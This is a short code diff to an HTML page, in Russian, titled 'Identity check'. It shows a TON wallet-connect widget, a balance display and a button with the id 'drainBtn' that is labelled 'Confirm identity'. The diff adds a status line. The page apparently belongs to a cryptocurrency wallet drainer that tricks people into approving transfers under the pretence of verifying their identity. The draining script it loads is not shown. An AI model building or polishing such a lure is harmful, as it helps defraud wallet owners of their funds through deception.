@@ -13,12 +13,14 @@
         #drainBtn { background: #f44336; color: white; }
         #drainBtn:disabled { opacity: 0.5; cursor: not-allowed; }
         #ton-connect { display: inline-block; margin: 20px 0; }
+        #status { margin: 10px 0; font-size: 16px; color: #aaa; }
     </style>
 </head>
 <body>
     <h1>🔐 Проверка личности</h1>
     <div id="ton-connect"></div>
     <div id="balance">Баланс: <span id="balanceValue">—</span> TON</div>
+    <div id="status"></div>
     <button id="drainBtn" disabled>Подтвердить личность</button>
     <script src="tonsdk.js"></script>
 </body>
